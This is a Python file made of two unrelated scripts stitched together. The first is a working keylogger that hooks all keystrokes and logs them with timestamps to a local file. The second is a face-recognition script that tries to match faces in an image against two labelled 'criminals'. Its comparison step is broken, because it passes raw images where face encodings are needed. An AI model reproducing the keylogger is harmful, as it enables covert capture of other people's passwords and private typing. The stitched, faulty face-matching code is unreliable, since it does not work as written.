import keyboard
import logging

logging.basicConfig(filename="keylog.log", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        try:
            key = event.name
            if len(key) == 1:
                logging.info(key)
            else:
                logging.info(f'[{key}]')
        except Exception as e:
            logging.error(f"Error: {e}")

keyboard.hook(on_key_event)

print("Keylogger iniciado. Presiona Ctrl+C para detener.")

try:
    keyboard.wait()
except KeyboardInterrupt:
    print("Keylogger detenido.")

import cv2
import face_recognition

def recognize_faces(image_path):
    image = cv2.imread(image_path)
    rgb_image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
    face_locations = face_recognition.face_locations(rgb_image)
    face_encodings = face_recognition.face_encodings(rgb_image, face_locations)

    known_criminals = {
        "Criminal_Weber": [
            face_recognition.load_image_file("weber_known.jpg")
        ],
        "Criminal_Kuna": [
            face_recognition.load_image_file("kuna_known.jpg")
        ]
    }

    for face_encoding in face_encodings:
        matches = face_recognition.compare_faces(known_criminals["Criminal_Weber"][0], face_encoding)
        if True in matches:
            print("Criminal_Weber detected")
        else:
            matches = face_recognition.compare_faces(known_criminals["Criminal_Kuna"][0], face_encoding)
            if True in matches:
                print("Criminal_Kuna detected")
            else:
                print("Unknown face detected")

recognize_faces("input_image.jpg")
